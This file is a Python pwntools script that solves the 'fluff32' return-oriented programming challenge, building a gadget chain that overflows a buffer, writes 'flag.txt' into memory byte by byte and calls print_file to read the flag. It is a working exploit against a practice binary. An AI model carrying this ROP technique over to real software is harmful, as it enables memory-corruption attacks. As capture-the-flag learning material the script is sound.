from pwn import *

elf = ELF("fluff32")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0xb1
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32 + 8
READ_SIZE = 512

MEMORY = elf.bss(0x800)
PATH = b'flag.txt'

POP_EBP_GADGET = next(elf.search(asm('pop ebp; ret')))
BOGUS_GADGET = elf.symbols.questionableGadgets
XCHG_DL_ECX_GADGET = elf.symbols.questionableGadgets + 0x12
POP_BSWAP_ECX_GADGET = elf.symbols.questionableGadgets + 0x15

MASK = 0xB0BABABA

def pext_mask(byte):
    m = 0
    pos = 0
    for i in range(8):
        bit = (byte >> i) & 1
        while ((MASK >> pos) & 1) != bit:
            pos += 1
        m |= (1 << pos)
        pos += 1
    return m

def make_write_byte_payload(address, byte):
    return [POP_BSWAP_ECX_GADGET, pack(address)[::-1], POP_EBP_GADGET, pext_mask(byte), BOGUS_GADGET, XCHG_DL_ECX_GADGET]

def make_write_data_payload(address, data):
    return [make_write_byte_payload(address + i, data[i]) for i in range(len(data))]

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write path one char at a time to memory
    rop.raw(make_write_data_payload(MEMORY, PATH))
    # call target function with path as argument
    rop.raw([elf.symbols.print_file, elf.symbols.main, MEMORY])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE
    
    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
